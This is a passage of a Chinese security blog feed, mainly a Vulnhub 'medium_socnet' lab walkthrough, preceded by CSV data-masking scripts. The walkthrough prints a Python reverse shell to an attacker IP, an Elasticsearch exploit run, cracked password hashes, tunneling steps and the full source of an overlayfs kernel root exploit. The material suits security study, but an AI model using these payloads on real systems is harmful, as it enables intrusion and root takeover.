class="hljs-title function_">remove_duplicates</span>(<span class="hljs-params">input_file, output_file</span>):<br>    seen_usernames = &#123;&#125;<br>    rows = []<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> infile:<br>        reader = csv.DictReader(infile)<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            username = row[<span class="hljs-string">&#x27;username&#x27;</span>]<br>            <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> seen_usernames:<br>                seen_usernames[username] = <span class="hljs-built_in">len</span>(rows)<br>            <span class="hljs-keyword">else</span>:<br>                seen_usernames[username] = <span class="hljs-built_in">len</span>(rows)<br>            rows.append(row)<br><br>    unique_rows = []<br>    <span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(rows):<br>        <span class="hljs-keyword">if</span> seen_usernames[row[<span class="hljs-string">&#x27;username&#x27;</span>]] == i:<br>            unique_rows.append(row)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> outfile:<br>        writer = csv.DictWriter(outfile, fieldnames=reader.fieldnames)<br>        writer.writeheader()<br>        writer.writerows(unique_rows)<br><br>input_file = <span class="hljs-string">&#x27;output_valid.csv&#x27;</span><br>output_file = <span class="hljs-string">&#x27;output.csv&#x27;</span><br><br>remove_duplicates(input_file, output_file)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_username</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(username) == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> username[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(username) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> username[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(username) - <span class="hljs-number">2</span>) + username[-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> username<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_password</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-keyword">return</span> md5_hash(password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_name</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> name[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> name[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(name) - <span class="hljs-number">2</span>) + name[-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> name<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_idcard</span>(<span class="hljs-params">idcard</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(idcard) == <span class="hljs-number">18</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">6</span> + idcard[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> idcard<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_phone</span>(<span class="hljs-params">phone</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(phone) == <span class="hljs-number">11</span>:<br>        <span class="hljs-keyword">return</span> phone[:<span class="hljs-number">3</span>] + <span class="hljs-string">&#x27;****&#x27;</span> + phone[<span class="hljs-number">7</span>:]<br>    <span class="hljs-keyword">return</span> phone<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    reader = csv.DictReader(csvfile)<br>    fieldnames = [<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;idcard&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>]<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1111.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> outfile:<br>        writer = csv.DictWriter(outfile, fieldnames=fieldnames)<br>        writer.writeheader()<br>        <br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            masked_row = &#123;<br>                <span class="hljs-string">&#x27;username&#x27;</span>: mask_username(row[<span class="hljs-string">&#x27;username&#x27;</span>]),<br>                <span class="hljs-string">&#x27;password&#x27;</span>: mask_password(row[<span class="hljs-string">&#x27;password&#x27;</span>]),<br>                <span class="hljs-string">&#x27;name&#x27;</span>: mask_name(row[<span class="hljs-string">&#x27;name&#x27;</span>]),<br>                <span class="hljs-string">&#x27;idcard&#x27;</span>: mask_idcard(row[<span class="hljs-string">&#x27;idcard&#x27;</span>]),<br>                <span class="hljs-string">&#x27;phone&#x27;</span>: mask_phone(row[<span class="hljs-string">&#x27;phone&#x27;</span>])<br>            &#125;<br>            writer.writerow(masked_row)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;脱敏处理完成，结果已写入 &#x27;1111.csv&#x27;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121051381.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub靶场-medium_socnet</title>
    <link href="/2024/09/13/vulnhub%E9%9D%B6%E5%9C%BA-medium_socnet/"/>
    <url>/2024/09/13/vulnhub%E9%9D%B6%E5%9C%BA-medium_socnet/</url>
    
    <content type="html"><![CDATA[<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>主机发现<br>arp-scan -l<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111514686.png" alt="image.png"><br>明显目标ip是192.168.56.141<br>全端口扫描<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111520165.png" alt="image.png"><br>服务发现<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111537721.png" alt="image.png"><br>它的http服务开在了5000端口<br>页面检查<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111550652.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111659029.png" alt="image.png"><br>随便试了几个sql语句好像没什么用，f12也没泄露什么东西，进行目录扫描<br>路径发现<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111702919.png" alt="image.png"><br>扫到一个admin<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111703303.png" alt="image.png"><br>打开可以看到直接就是admin权限，而且这个exec，是命令执行函数，我们直接试试</p><h1 id="2-打点"><a href="#2-打点" class="headerlink" title="2.打点"></a>2.打点</h1><p>命令执行<br>鉴于刚才我们nmap扫出来这个是用python2的服务，所以我们就采用python的反弹shell<br>python反弹shell<br><code>import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.29.61.154&#39;,1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111954907.png" alt="image.png"></p><h1 id="3-docker逃逸"><a href="#3-docker逃逸" class="headerlink" title="3.docker逃逸"></a>3.docker逃逸</h1><p>这里看到直接是root权限，还以为结束了，后面翻目录才发现不对劲<br>发现是docker<br>ls &#x2F;.dockerenv<br>cat &#x2F;proc&#x2F;1&#x2F;cgroup<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111956855.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111957813.png" alt="image.png"><br>这两个就是明显的docker特征，其中下面这个就是docker容器的哈希值<br>ip a,内网网段<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111958522.png" alt="image.png"><br>发现我们处于内网的网段，接下来就是找到主机所在ip<br>主机发现<br><code>for x in $(seq 1 254); for y in $(seq 1 254); do ping -c 1 172.17.&amp;x.$y;done</code>（这个是扫B段，会扫65535个ip）<br>这道题就不用扫这么多<br><code>for i in $(seq 1 254);do ping -c 1 172.17.0.$i;done</code>即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100014074.png" alt="image.png"><br>可以看到这道题中.1.2.3都ping的通，说明这三台主机都是存活的<br>我们通过venom进行内网穿透<br><a href="https://github.com/Dliv3/Venom/releases/tag/v1.1.0">Release Venom v1.1.0 · Dliv3&#x2F;Venom (github.com)</a><br>客户端agent<br>服务端admin<br><code>./admin_linux_x64 -lport 1111</code><br>本机开个服务器，把客户端传到docker里<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100027244.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100027555.png" alt="image.png"><br>chmod +x .&#x2F;agent_linux_x64<br>.&#x2F;客户端 -rhost kali ip -rport 端口<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100036774.png" alt="image.png"><br>show<br>goto节点<br>socks 1080监听<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100037730.png" alt="image.png"><br>vim &#x2F;etc&#x2F;proxychains4.conf<br>socks5 127.0.0.1 1080<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100038134.png" alt="image.png"><br>至此我们的本机已经跟真正的机器连接上了<br>对172.17.0.1进行端口扫描<br>proxychains4 rustscan -a 172.17.0.1</p><p>发现还是只开放了22和5000，和我们之前扫到的一模一样<br>proxychains firefox<br>访问<br>发现访问到的内容还是一样的，甚至我们之前输入的内容还都一样<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100047533.png" alt="image.png"><br>那这可能只是做了个映射<br>rustscan太慢了，这里换nmap<br>proxychains4 nmap -Pn -sT 172.17.0.3<br>只开放了一个9200 Elasticsearch 1.4.2<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100057919.png" alt="image.png"><br>searchsploit Elasticsearch<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100053501.png" alt="image.png"><br>这里就拿第一个试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100056869.png" alt="image.png"><br>proxychains python2 36337.py 172.17.0.3<br>id一看<br>又是root<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100100079.png" alt="image.png"><br>简单看下系统信息，在根目录下看到一个passwords<br>有账号跟密码的hash值</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Format:</span> number,number,number,number,lowercase,lowercase,lowercase,lowercase<br><span class="hljs-symbol">Example:</span> <span class="hljs-number">1234</span>abcd<br><span class="hljs-symbol">john:</span><span class="hljs-number">3</span>f8184a7343664553fcb5337a3138814<br><span class="hljs-symbol">test:</span><span class="hljs-number">861</span>f194e9d6118f3d942a72be3e51749<br><span class="hljs-symbol">admin:</span><span class="hljs-number">670</span>c3bbc209a18dde5446e5e6c1f1d5b<br><span class="hljs-symbol">root:</span>b3d34352fc26117979deabdf1b9b6354<br><span class="hljs-symbol">jane:</span><span class="hljs-number">5</span>c158b60ed97c723b673529b8a3cf72b<br></code></pre></td></tr></table></figure><p>找个网站直接破解<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100102189.png" alt="image.png"></p><p>拿到ip上去登录ssh<br>john 1337hack（经过尝试只有这个能连上）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100104495.png" alt="image.png"></p><h1 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100104992.png" alt="image.png"><br>sudo -s<br>没有sudo权限<br>内核提权<br>uname -a linux3.13<br>其实这算是个比较经典的内核版本，一搜就能搜到它的内核提权脚本<br>而且这个内核通常伴随着没有gcc的问题，我们可以看看有没有cc<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100105303.png" alt="image.png"><br>好吧，都没有<br>那我们只能直接改代码，把编译的部分都删掉，然后本地编译(其实就最下面删了一部分内容)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIB <span class="hljs-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> child_stack[<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">child_exec</span><span class="hljs-params">(<span class="hljs-type">void</span> *stuff)</span><br>&#123;<br>    <span class="hljs-type">char</span> *file;<br>    system(<span class="hljs-string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);<br>    mkdir(<span class="hljs-string">&quot;/tmp/ns_sploit&quot;</span>, <span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;/tmp/ns_sploit/work&quot;</span>, <span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;/tmp/ns_sploit/upper&quot;</span>,<span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>,<span class="hljs-number">0777</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;mount #1\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="hljs-string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="hljs-string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&#x27;t use /proc as lower</span><br>        <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="hljs-string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="hljs-string">&quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        file = <span class="hljs-string">&quot;.access&quot;</span>;<br>        chmod(<span class="hljs-string">&quot;/tmp/ns_sploit/work/work&quot;</span>,<span class="hljs-number">0777</span>);<br>    &#125; <span class="hljs-keyword">else</span> file = <span class="hljs-string">&quot;ns_last_pid&quot;</span>;<br><br>    chdir(<span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>);<br>    rename(file,<span class="hljs-string">&quot;ld.so.preload&quot;</span>);<br><br>    chdir(<span class="hljs-string">&quot;/&quot;</span>);<br>    umount(<span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;mount #2\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="hljs-string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="hljs-string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="hljs-string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="hljs-string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        chmod(<span class="hljs-string">&quot;/tmp/ns_sploit/work/work&quot;</span>,<span class="hljs-number">0777</span>);<br>    &#125;<br><br>    chmod(<span class="hljs-string">&quot;/tmp/ns_sploit/o/ld.so.preload&quot;</span>,<span class="hljs-number">0777</span>);<br>    umount(<span class="hljs-string">&quot;/tmp/ns_sploit/o&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> status, fd, lib;<br>    <span class="hljs-type">pid_t</span> wrapper, init;<br>    <span class="hljs-type">int</span> clone_flags = CLONE_NEWNS | SIGCHLD;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;spawning threads\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>((wrapper = fork()) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span>(unshare(CLONE_NEWUSER) != <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create new user namespace\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span>((init = fork()) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">pid_t</span> pid =<br>                clone(child_exec, child_stack + (<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>), clone_flags, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create new mount namespace\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            waitpid(pid, &amp;status, <span class="hljs-number">0</span>);<br><br>        &#125;<br><br>        waitpid(init, &amp;status, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    usleep(<span class="hljs-number">300000</span>);<br><br>    wait(<span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;child threads done\n&quot;</span>);<br><br>    fd = open(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>,O_WRONLY);<br><br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;exploit failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;/etc/ld.so.preload created\n&quot;</span>);<br>    write(fd,<span class="hljs-string">&quot;/tmp/ofs-lib.so\n&quot;</span>,<span class="hljs-number">16</span>);<br>    close(fd);<br>    system(<span class="hljs-string">&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;</span>);<br>    execl(<span class="hljs-string">&quot;/bin/su&quot;</span>,<span class="hljs-string">&quot;su&quot;</span>,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc -o exp 37292.c<br>然后要找一个已经编译好的库文件<br>locate ofs-lib.so<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409100108952.png" alt="image.png"><br>然后一起传到目标机器上<br>这里环境出了点问题，换到ubuntu上执行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409101336958.png" alt="image.png"><br>chmod +x exp<br>.&#x2F;exp</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一开始的提权不难，但是后面代理，隧道都很新颖，单个靶机打出了域的感觉</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF中有关md5的总结</title>
    <link href="/2024/09/12/CTF%E4%B8%AD%E6%9C%89%E5%85%B3md5%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%88WEB%EF%BC%89/"/>
    <url>/2024/09/12/CTF%E4%B8%AD%E6%9C%89%E5%85%B3md5%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%88WEB%EF%BC%89/</url>
    
